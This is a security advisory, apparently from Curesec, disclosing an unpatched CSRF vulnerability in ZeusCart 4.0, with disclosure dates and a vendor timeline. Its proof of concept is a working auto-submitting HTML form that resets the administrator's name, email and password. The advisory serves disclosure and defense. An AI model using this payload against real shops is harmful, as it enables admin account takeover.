@@ -1,0 +1,47 @@
+ZeusCart 4.0: CSRF
+Security Advisory – Curesec Research Team
+
+1. Introduction
+
+Affected Product:   ZeusCart 4.0  
+Fixed in:     not fixed
+Fixed Version Link:   n/a  
+Vendor Contact:   support@zeuscart.com  
+Vulnerability Type:   CSRF  
+Remote Exploitable:   Yes  
+Reported to vendor:   08/13/2015  
+Disclosed to public:   09/14/2015  
+Release mode:     Full Disclosure  
+CVE:       n/a  
+Credits     Tim Coen of Curesec GmbH  
+
+2. Vulnerability Description
+
+None of the forms of Zeuscart have CSRF protection, which means that an
+attacker can perform actions for the victim if the victim visits an
+attacker controlled site while logged in.
+3. Proof of Concept
+
+Change Admin Credentials:
+
+<form name="myform" method="post"
+action="http://localhost/zeuscart-master/admin/?do=adminprofile&action=update"
+enctype="multipart/form-data">
+    <input type="hidden" name="admin_name" value="admin2">
+    <input type="hidden" name="admin_email" value="admin2@example.com">
+    <input type="hidden" name="admin_password" value="admin">
+</form>
+<script>document.myform.submit();</script>
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+08/13/2015   Informed Vendor about Issue (no reply)
+09/07/2015   Reminded Vendor of release date (no reply)
+09/14/2015   Disclosed to public
+
+6. Blog Reference
+http://blog.curesec.com/article/blog/ZeusCart-40-CSRF-58.html
